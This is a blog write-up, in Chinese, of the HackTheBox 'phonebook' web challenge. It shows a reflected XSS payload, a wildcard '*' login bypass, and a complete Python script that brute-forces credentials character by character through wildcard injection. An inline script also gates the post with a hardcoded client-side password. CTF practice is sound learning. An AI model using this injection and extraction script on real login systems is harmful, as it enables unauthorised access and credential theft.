---
title: '[HTB]phonebook | writeup'
date: 2021-12-15 17:00:03
tags: [HTB,web,刷题,靶场]
published: true
hideInList: false
feature: 
isTop: false
---

输入错误的用户名和密码,发现提示权限失败的message是通过url传输的,构造payload引起alert的弹窗

payload : [`http://178.62.5.61:31279/login?message=<img src=1 onerror=alert(123)>`](http://178.62.5.61:31279/login?message=%3Cimg%20src=1%20onerror=alert(123)%3E)

但是还是需要登陆的,在登陆页面输入wildcards的'*'(用户名和密码均是).因为没有前面的过滤,直接把*传递到后台,所以就能登陆进去了.

进行code review.发现请求了一个/search 的api,如果成功,就显示search后的结果(以table的方式)

<!-- more -->
<script language = JavaScript> function password() {

    var testV = 1;

    var pass1 = prompt('please input the password','');

    var passwordforthisarticle = "dhlove";

    var inputtimemax = 5;

    while (testV < inputtimemax) {

    if (!pass1)

    history.go(-1);

    if (pass1 == passwordforthisarticle) {

    break;

    }

    testV+=1;

    var pass1 =

    prompt('Password error!');

    }

    if (pass1!= passwordforthisarticle & testV == inputtimemax)  

    history.go(-1);

    return " ";

    }

    document.write(password());

</script>

发现关键还是在登陆位置,需要写脚本去遍历可能的用户名和用户名密码.我的脚本如下(最后完整版,包括密码的遍历):

```python
import requests
from bs4 import BeautifulSoup

lab_address = 'http://{your-lab-id}/login'
alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
all_list = alphabet + ['{','}','1','2','3','4','5','6','7','8','9','0','-','_']

def login(username,password='',flag=0):
    """login page"""
    name = username
    pwd = password
    for _ in all_list:
        if flag == 1:
            pwd = password + _
        else:
            name = username + _
        response = requests.post(lab_address,data={'username':'{}*'.format(name),'password':'{}*'.format(pwd)})
        if('No search results.' in response.text):
            # print('\t return:{}'.format(_))
            return _
        
    return -1

def main():
    password = ""
    username = ""
    ifbreak = False
    flag = 0
    while(ifbreak is not True): #Test username
        res = login(username,password=password,flag=flag)
        # print('\tflag:{} res:{}'.format(flag,res))
        if res != -1 and flag == 0:
            username += res
        elif res == -1 and flag!=1:
            flag = 1
        elif res != -1 and flag == 1:
            password += res
        else:
            ifbreak = True
        print('\r[*]','Now auth is "{}:{}"'.format(username,password), end='', flush=True)

    

main()
```